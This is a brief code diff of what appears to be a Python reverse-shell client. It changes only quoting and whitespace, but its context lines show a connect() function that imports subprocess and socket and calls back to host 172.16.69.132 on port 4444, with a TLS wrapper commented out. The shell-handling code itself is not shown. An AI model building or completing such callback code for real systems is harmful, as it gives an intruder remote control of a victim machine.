@@ -1,3 +1,4 @@
+
 import os, subprocess, socket
 import ssl
 
@@ -9,7 +10,7 @@ def connect():
         global s
         global sock
 
-        host = '172.16.69.132'
+        host = "172.16.69.132"
         port = 4444
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
